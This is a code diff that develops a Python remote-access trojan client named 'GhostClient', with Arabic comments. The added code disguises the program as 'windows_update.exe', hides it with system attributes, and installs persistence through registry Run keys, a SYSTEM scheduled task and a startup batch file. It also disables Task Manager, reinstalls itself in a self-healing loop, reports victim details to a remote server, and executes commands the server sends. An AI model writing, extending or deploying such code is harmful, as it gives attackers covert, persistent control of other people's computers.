@@ -1367,56 +1367,103 @@ class GhostClient:
         self.script_path = os.path.abspath(__file__)
         self.hidden_name = "windows_update.exe"
         self.hidden_path = ""
+        self.last_seen = time.time()
         
+    def is_admin(self):
+        """التحقق إذا كان البرنامج يعمل بصلاحيات المدير"""
+        try:
+            return ctypes.windll.shell32.IsUserAnAdmin()
+        except:
+            return False
+    
     def clean_old_versions(self):
         """مسح جميع النسخ القديمة من النظام"""
         try:
-            # البحث عن جميع النسخ القديمة
+            print("🧹 Searching for old versions to clean...")
+            # البحث عن جميع النسخ القديمة في جميع المواقع المحتملة
             search_patterns = [
+                # System32 (يحتاج صلاحيات)
                 os.path.join(os.environ['WINDIR'], 'System32', 'winupdate_*.exe'),
                 os.path.join(os.environ['WINDIR'], 'System32', 'windows_update.exe'),
+                # ProgramData
                 os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', 'winupdate_*.exe'),
+                os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', 'windows_update.exe'),
+                # Temp
                 os.path.join(os.environ['TEMP'], 'winupdate_*.exe'),
                 os.path.join(os.environ['TEMP'], 'windows_update.exe'),
-                os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'SystemMaintenance.bat')
+                # AppData
+                os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'winupdate_*.exe'),
+                os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'windows_update.exe'),
+                # User Profile
+                os.path.join(os.environ['USERPROFILE'], 'winupdate_*.exe'),
+                os.path.join(os.environ['USERPROFILE'], 'windows_update.exe'),
+                # Startup files
+                os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'SystemMaintenance.bat'),
+                os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'WindowsUpdate.bat'),
+                os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'SystemMaintenance.bat')
             ]
             
+            deleted_count = 0
             for pattern in search_patterns:
                 for old_file in glob.glob(pattern):
                     try:
-                        # إزالة الحماية أولاً
-                        subprocess.run(f'attrib -s -h -r "{old_file}"', shell=True, capture_output=True)
-                        os.remove(old_file)
-                        print(f"✓ Deleted old version: {old_file}")
-                    except:
+                        if os.path.exists(old_file):
+                            # تخطي الملف الحالي إذا كان هو نفسه
+                            if os.path.abspath(old_file) == os.path.abspath(self.script_path):
+                                continue
+                                
+                            print(f"🗑️  Found old version: {old_file}")
+                            # إزالة الحماية أولاً
+                            subprocess.run(f'attrib -s -h -r "{old_file}"', shell=True, capture_output=True)
+                            os.remove(old_file)
+                            print(f"✅ Deleted: {old_file}")
+                            deleted_count += 1
+                    except Exception as e:
+                        print(f"❌ Failed to delete {old_file}: {e}")
                         continue
-                        
-            # مسح المهام المجدولة القديمة
-            try:
-                subprocess.run('schtasks /delete /tn "WindowsSystemMaintenance" /f', shell=True, capture_output=True)
-                subprocess.run('schtasks /delete /tn "WindowsUpdate" /f', shell=True, capture_output=True)
-            except:
-                pass
-                
+            
+            # مسح المهام المجدولة القديمة (تحتاج صلاحيات)
+            if self.is_admin():
+                try:
+                    subprocess.run('schtasks /delete /tn "WindowsSystemMaintenance" /f', shell=True, capture_output=True)
+                    subprocess.run('schtasks /delete /tn "WindowsUpdate" /f', shell=True, capture_output=True)
+                    print("✅ Old scheduled tasks cleaned")
+                except:
+                    pass
+            
             # مسح إدخالات الريجستري القديمة
             try:
-                subprocess.run('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsSystemUpdate" /f', shell=True, capture_output=True)
-                subprocess.run('reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /f', shell=True, capture_output=True)
+                subprocess.run(r'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsSystemUpdate" /f', shell=True, capture_output=True)
+                subprocess.run(r'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /f', shell=True, capture_output=True)
+                print("✅ Old registry entries cleaned")
             except:
                 pass
                 
-            return "Old versions cleaned"
+            return f"Cleaned {deleted_count} old versions"
         except Exception as e:
             return f"Clean error: {e}"
     
     def hide_and_protect(self):
         """إخفاء وحماية الملف في النظام"""
         try:
-            # المسار النهائي المخفي
-            self.hidden_path = os.path.join(os.environ['WINDIR'], 'System32', self.hidden_name)
+            # استخدام مجلد AppData بدلاً من System32 لتجنب مشاكل الصلاحيات
+            hidden_dir = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows')
+            os.makedirs(hidden_dir, exist_ok=True)
+            self.hidden_path = os.path.join(hidden_dir, self.hidden_name)
             
-            # مسح النسخ القديمة أولاً
-            self.clean_old_versions()
+            # إذا كان الملف موجوداً ومطابقاً للنسخة الحالية، لا نعيد النسخ
+            if os.path.exists(self.hidden_path):
+                try:
+                    with open(self.script_path, 'rb') as current_file:
+                        current_content = current_file.read()
+                    with open(self.hidden_path, 'rb') as hidden_file:
+                        hidden_content = hidden_file.read()
+                    if current_content == hidden_content:
+                        print("✅ Hidden file is up to date")
+                        self.script_path = self.hidden_path
+                        return f"File already hidden at: {self.hidden_path}"
+                except:
+                    pass
             
             # نسخ الملف إلى المكان المخفي
             with open(self.script_path, 'rb') as src:
@@ -1425,10 +1472,6 @@ class GhostClient:
             
             # إخفاء وحماية الملف
             subprocess.run(f'attrib +s +h +r "{self.hidden_path}"', shell=True, capture_output=True)
-            
-            # منع الحذف نهائياً
-            subprocess.run(f'icacls "{self.hidden_path}" /deny Everyone:F', shell=True, capture_output=True)
-            subprocess.run(f'icacls "{self.hidden_path}" /deny Administrators:F', shell=True, capture_output=True)
             
             # تحديث مسار السكريبت
             self.script_path = self.hidden_path
@@ -1441,39 +1484,49 @@ class GhostClient:
         """تثبيت التشغيل التلقائي"""
         try:
             if os.name == 'nt':
-                print("Installing persistence...")
+                print("🔧 Installing persistence...")
                 
-                # 1. Registry Run (المستخدم الحالي)
+                # 1. Registry Run (المستخدم الحالي) - لا يحتاج صلاحيات
                 try:
                     key = winreg.HKEY_CURRENT_USER
-                    subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+                    subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                     with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                         winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, f'"{self.hidden_path}"')
-                    print("✓ Registry persistence")
-                except: pass
+                    print("✅ Registry persistence")
+                except Exception as e: 
+                    print(f"❌ Registry persistence failed: {e}")
                 
-                # 2. Scheduled Task (لجميع المستخدمين - الأقوى)
-                try:
-                    task_cmd = f'schtasks /create /tn "WindowsUpdate" /tr "\\"{self.hidden_path}\\"" /sc onlogon /ru SYSTEM /f'
-                    subprocess.run(task_cmd, shell=True, capture_output=True, timeout=10)
-                    print("✓ Scheduled task persistence")
-                except: pass
+                # 2. Scheduled Task (يحتاج صلاحيات مدير)
+                if self.is_admin():
+                    try:
+                        task_cmd = f'schtasks /create /tn "WindowsUpdate" /tr "\"{self.hidden_path}\"" /sc onlogon /ru SYSTEM /f'
+                        result = subprocess.run(task_cmd, shell=True, capture_output=True, timeout=10)
+                        if result.returncode == 0:
+                            print("✅ Scheduled task persistence")
+                        else:
+                            print("❌ Scheduled task failed")
+                    except: 
+                        print("❌ Scheduled task failed - Admin required")
+                else:
+                    print("ⓘ Scheduled task skipped - Admin required")
                 
-                # 3. Startup Folder (إصلاح الخطأ هنا)
+                # 3. Startup Folder (لا يحتاج صلاحيات)
                 try:
-                    startup_path = os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+                    startup_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                     os.makedirs(startup_path, exist_ok=True)
                     bat_path = os.path.join(startup_path, 'WindowsUpdate.bat')
                     
                     # كتابة الملف بشكل صحيح
                     with open(bat_path, 'w') as f:
-                        f.write('@echo off' + os.linesep + 'start "" "' + self.hidden_path + '"' + os.linesep)
+                        f.write('@echo off' + os.linesep)
+                        f.write(f'start "" "{self.hidden_path}"' + os.linesep)
+                        f.write('exit' + os.linesep)
                     
                     # إخفاء ملف الباتش
                     subprocess.run(f'attrib +s +h +r "{bat_path}"', shell=True, capture_output=True)
-                    print("✓ Startup folder persistence")
+                    print("✅ Startup folder persistence")
                 except Exception as e: 
-                    print(f"Startup error: {e}")
+                    print(f"❌ Startup folder failed: {e}")
                     
             return "Persistence installed successfully"
         except Exception as e:
@@ -1488,12 +1541,19 @@ class GhostClient:
             pass
     
     def block_task_manager(self):
-        """حماية من Task Manager"""
-        try:
-            block_cmd = r'reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f'
-            subprocess.run(block_cmd, shell=True, capture_output=True, timeout=5)
-        except:
-            pass
+        """حماية من Task Manager (يحتاج صلاحيات)"""
+        if self.is_admin():
+            try:
+                block_cmd = r'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f'
+                result = subprocess.run(block_cmd, shell=True, capture_output=True, timeout=5)
+                if result.returncode == 0:
+                    return "Task Manager blocked"
+                else:
+                    return "Failed to block Task Manager"
+            except:
+                return "Failed to block Task Manager"
+        else:
+            return "Admin required to block Task Manager"
     
     def start_self_healing(self):
         """بدء نظام الشفاء الذاتي"""
@@ -1502,15 +1562,17 @@ class GhostClient:
                 try:
                     # التحقق من وجود الملف المخفي
                     if not os.path.exists(self.hidden_path):
-                        print("File missing - reinstalling...")
+                        print("🔄 File missing - reinstalling...")
                         self.hide_and_protect()
                     
-                    # التحقق من المهام المجدولة
-                    result = subprocess.run('schtasks /query /tn "WindowsUpdate"', shell=True, capture_output=True, text=True)
-                    if "WindowsUpdate" not in result.stdout:
-                        self.install_persistence()
+                    # التحقق من المهام المجدولة (للمدير فقط)
+                    if self.is_admin():
+                        result = subprocess.run('schtasks /query /tn "WindowsUpdate"', shell=True, capture_output=True, text=True)
+                        if "WindowsUpdate" not in result.stdout:
+                            print("🔄 Scheduled task missing - reinstalling...")
+                            self.install_persistence()
                     
-                    time.sleep(60)  # تحقق كل دقيقة
+                    time.sleep(30)  # تحقق كل 30 ثانية للسرعة
                     
                 except:
                     time.sleep(30)
@@ -1526,18 +1588,24 @@ class GhostClient:
                 'os': f"{platform.system()} {platform.release()}",
                 'type': 'ghost_client',
                 'user': getpass.getuser(),
-                'status': 'active'
+                'status': 'active',
+                'admin': self.is_admin()
             }
             
             response = requests.post(
                 f"{self.server_url}/register",
                 json=data,
-                timeout=10
+                timeout=10,
+                headers={'User-Agent': 'GhostClient/1.0'}
             )
             
             if response.status_code == 200:
-                self.registered = True
-                return True
+                result = response.json()
+                if result.get('success'):
+                    self.registered = True
+                    self.last_seen = time.time()
+                    return True
+                
             return False
             
         except:
@@ -1572,60 +1640,91 @@ class GhostClient:
     def get_system_info(self):
         """معلومات النظام"""
         try:
+            # حساب وقت النشاط
+            uptime = time.time() - self.last_seen
+            hours = int(uptime // 3600)
+            minutes = int((uptime % 3600) // 60)
+            
             info = f"""
-GHOST CLIENT - ACTIVE & PROTECTED
-Computer: {platform.node()}
-User: {getpass.getuser()}
-OS: {platform.system()} {platform.version()}
-Client ID: {self.client_id}
-Server: {self.server_url}
-Status: ACTIVE & STEALTH
-Hidden Path: {self.hidden_path}
-Connection: {'CONNECTED' if self.registered else 'RECONNECTING'}
-Protection: ENABLED
-Auto-Start: GUARANTEED
+🎯 GHOST CLIENT - ACTIVE & PROTECTED
+🖥️  Computer: {platform.node()}
+👤 User: {getpass.getuser()}
+💻 OS: {platform.system()} {platform.version()}
+🆔 Client ID: {self.client_id}
+🌐 Server: {self.server_url}
+📊 Status: {'✅ CONNECTED' if self.registered else '🔄 RECONNECTING'}
+📁 Hidden Path: {self.hidden_path}
+⏰ Uptime: {hours}h {minutes}m
+🛡️ Protection: ENABLED
+🚀 Auto-Start: GUARANTEED
+🔐 Admin Rights: {'✅ YES' if self.is_admin() else '❌ NO'}
 """
             return info
         except:
             return "System information available"
     
     def persistent_connection(self):
-        """اتصال مستمر مع السيرفر"""
+        """اتصال مستمر مع السيرفر - أسرع"""
         def connection_worker():
             while self.running:
                 try:
-                    # محاولة التسجيل
+                    # محاولة التسجيل إذا لم نكون مسجلين
                     if not self.registered:
                         if self.register_with_server():
-                            print("✓ Connected to server: https://game-python-1.onrender.com")
+                            print("✅ Connected to server")
                         else:
-                            time.sleep(5)
+                            time.sleep(3)  # انتظار أقل بين المحاولات
                             continue
+                    
+                    # تحديث حالة النشاط باستمرار
+                    self.update_presence()
                     
                     # التحقق من الأوامر باستمرار
                     self.check_commands()
                     
-                    # انتظر 2 ثانية فقط بين المحاولات
-                    time.sleep(2)
+                    # انتظر 1 ثانية فقط بين المحاولات للسرعة
+                    time.sleep(1)
                     
                 except Exception as e:
-                    time.sleep(5)
+                    time.sleep(2)  # انتظار أقل عند الأخطاء
         
         threading.Thread(target=connection_worker, daemon=True).start()
     
+    def update_presence(self):
+        """تحديث حالة النشاط للسيرفر"""
+        try:
+            data = {
+                'client_id': self.client_id,
+                'computer': platform.node(),
+                'user': getpass.getuser(),
+                'os': f"{platform.system()} {platform.release()}",
+                'status': 'online',
+                'admin': self.is_admin()
+            }
+            
+            requests.post(
+                f"{self.server_url}/register",
+                json=data,
+                timeout=5  # وقت أقل للاستجابة
+            )
+            self.last_seen = time.time()
+            
+        except:
+            self.registered = False
+    
     def check_commands(self):
-        """التحقق من الأوامر الجديدة"""
+        """التحقق من الأوامر الجديدة - أسرع"""
         try:
             response = requests.get(
                 f"{self.server_url}/commands?client={self.client_id}",
-                timeout=10
+                timeout=5  # وقت أقل للاستجابة
             )
             
             if response.status_code == 200:
                 data = response.json()
                 if data.get('command'):
                     command = data['command']
-                    print(f"Executing: {command}")
+                    print(f"🎯 Executing: {command}")
                     
                     # تنفيذ الأمر فوراً
                     result = self.execute_command_immediately(command)
@@ -1638,8 +1737,9 @@ Auto-Start: GUARANTEED
                             'command': command,
                             'response': result
                         },
-                        timeout=10
+                        timeout=5
                     )
+                    print("✅ Response sent")
                     
         except:
             pass
@@ -1649,32 +1749,37 @@ Auto-Start: GUARANTEED
         # إخفاء النافذة فوراً
         self.hide_process()
         
-        print("Initializing Ghost Client...")
-        print(f"Target Server: {self.server_url}")
+        print("🚀 Initializing Ghost Client...")
         
-        # 1. تنظيف النسخ القديمة
+        # 1. تنظيف النسخ القديمة أولاً
+        print("🧹 Cleaning old versions...")
         clean_result = self.clean_old_versions()
-        print(f"Cleanup: {clean_result}")
+        print(f"✅ {clean_result}")
         
         # 2. إخفاء وحماية الملف
+        print("🛡️ Hiding and protecting file...")
         hide_result = self.hide_and_protect()
-        print(f"Protection: {hide_result}")
+        print(f"✅ {hide_result}")
         
         # 3. تثبيت التشغيل التلقائي
+        print("🔧 Installing persistence...")
         persistence_result = self.install_persistence()
-        print(f"Persistence: {persistence_result}")
+        print(f"✅ {persistence_result}")
         
         # 4. بدء أنظمة الحماية
+        print("⚙️ Starting protection systems...")
         self.block_task_manager()
         self.start_self_healing()
+        print("✅ Protection systems activated")
         
-        # 5. بدء الاتصال المستمر
+        # 5. بدء الاتصال المستمر - الأسرع
+        print("🌐 Starting persistent connection...")
         self.persistent_connection()
-        print("Ghost Client activated - Auto-reconnect enabled")
+        print("✅ Ghost Client activated - Fast auto-reconnect enabled")
         
         # الحلقة الرئيسية الخفيفة
         while self.running:
-            time.sleep(1)
+            time.sleep(0.5)  # حلقة أسرع
 
 def main():
     client = GhostClient()
